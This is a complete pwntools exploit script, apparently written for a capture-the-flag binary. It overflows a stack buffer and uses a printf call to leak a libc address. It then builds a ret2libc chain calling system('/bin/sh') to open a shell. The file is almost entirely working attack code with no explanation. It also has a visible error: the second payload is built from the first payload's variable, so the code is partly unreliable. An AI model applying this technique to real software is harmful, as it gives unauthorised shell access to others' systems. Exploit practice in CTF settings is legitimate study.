from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='i386', kernel='amd64',log_level='debug')



elf=ELF('./pwn')
context(os='linux', arch='i386',log_level='debug')
io=gdb.debug('./pwn')
#io=process('./ez_pz_hackover_2016')
#io=process('./pwn')
#io=remote('',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive



#libc=ELF('./libc.so.6')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
printf_plt=elf.plt['printf']


printf_got=elf.got['printf']


main_addr= 0x486E2 #elf.plt['main']

payload=b'crashme'+b'\x00'
payload=payload.ljust(0x30+4,b'a')



payload+=p32(printf_plt)+p32(main_addr)+p32(printf_got)
ru(b'Whats your name?\n')
ru(b'>')

sl(payload)




#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
printf_addr=u32(io.recvuntil(b'\xf7')[-4:])
#ru(b'0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#print(hex(rbp))


#libc=LibcSearcher('printf',printf_addr)
#libc_base_addr=printf_addr-libc.dump('printf')
#system_addr=libc_base_addr+libc.dump('system')
#bin_sh_addr=libc_base_addr+libc.dump('str_bin_sh')



libc_base_addr=printf_addr-libc.sym['printf']
system_addr=libc_base_addr+ libc.sym['system']    
bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))


payload2=b'crashme'+b'\x00'
payload2=payload.ljust(0x30+4,b'a')


payload2+=p32(system_addr)+b'bbbb'+p32(bin_sh_addr)

ru(b'>')

sl(payload2)





ii()
